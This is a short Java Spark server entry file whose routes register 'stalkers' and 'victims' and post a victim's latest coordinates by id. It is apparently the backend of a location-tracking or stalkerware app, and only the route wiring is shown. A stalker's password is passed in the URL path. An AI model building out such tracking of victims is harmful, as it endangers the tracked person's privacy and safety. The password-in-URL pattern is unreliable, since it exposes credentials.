import static spark.Spark.*;

import com.google.gson.Gson;
import spark.*;

public class Main {

    public static void main(String[] args)
    {
        DbController db=new DbController();
        Routes routes=new Routes(db);

        get("/test",routes.testRoute);

        //----------------------------------------STALKER ROUTES--------------------------------------------------------
        post("/stalker/addStalker",routes.addStalker); //adds stalker from body
        get("/stalker/getStalker/:name/:password",routes.getStalker);


        //----------------------------------------VICTIM ROUTES---------------------------------------------------------
        post("/victim/updatesParams/:id",routes.updateParams); //update last cordinates of VIVTIM with id= :id
        post("/victim/addVictim",routes.addVictim); //adds VICTIM
        get("/victim/getVictim/:id/:name",routes.getVictim);

    }

}
